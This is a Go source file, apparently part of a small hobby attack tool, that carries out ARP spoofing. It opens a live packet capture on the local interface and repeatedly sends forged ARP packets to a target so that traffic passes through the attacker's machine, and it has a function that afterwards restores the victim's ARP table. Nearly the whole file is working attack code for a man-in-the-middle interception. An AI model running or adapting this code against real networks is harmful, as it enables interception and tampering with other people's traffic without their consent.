package arpoof

import (
	"log"
	"time"

	hdisc "github.com/KennyZ69/HdiscLib"
	"github.com/google/gopacket/pcap"
)

func Spoof(target, gateway hdisc.DevData) {
	log.Println("Starting spoofing function")
	stop := make(chan struct{}, 2) // INFO: len 2 because I need to cancel the reading and writing

	ifi, err := hdisc.LocalIface()
	if err != nil {
		log.Fatalf("Error getting local net interface: %s\n", err)
	}

	handle, err := pcap.OpenLive(ifi.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening pcap.Handle: %s\n", err)
	}
	defer handle.Close()

	ownIP, _, err := hdisc.GetLocalNet()
	if err != nil {
		log.Fatalf("Error getting local ipnet and ip: %s\n", err)
	}

	localDev := &hdisc.DevData{IP: ownIP, Mac: ifi.HardwareAddr}

	go func() {
		handleExit(handle, target, gateway)
		close(stop)
	}()

	go readARP()

	<-WriteARPPack(handle, *localDev, target, time.Second*2, stop)

	// when there is a signal to stop from writing, continue to return
	return
}

// as the attackMac a nil can be passed if you want your local machine as the middle man
func WriteARPPack(handle *pcap.Handle, attacker, target hdisc.DevData, timeout time.Duration, stop chan struct{}) chan struct{} {

	stopped := make(chan struct{})

	go func(stopped chan struct{}) {
		t := time.NewTicker(timeout)
		for {
			select {
			case <-stop:
				log.Println("ARP Spoofing stopped!")
				stopped <- struct{}{}
				return
			default:
				<-t.C
				// as I am spoofing just one target I should end when there is an error I guess
				p, err := NewARPReq(attacker, target)
				if err != nil {
					// error building new arp request for spoofing
					log.Printf("Error creating arp request: %s\n", err)
					continue
				}
				if err = handle.WritePacketData(p); err != nil {
					// error writing packet to open handle
					log.Printf("Error writing packet to handle: %s\n", err)
					continue
				}
			}
		}
	}(stopped)

	return stopped
}

func RestoreARPTables(handle *pcap.Handle, src, victim hdisc.DevData) chan struct{} {
	log.Println("Restoring ARP tables on the victim machine...")

	stopCh := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopCh)
	}()

	return WriteARPPack(handle, src, victim, time.Millisecond*500, stopCh)
}

func readARP() {}
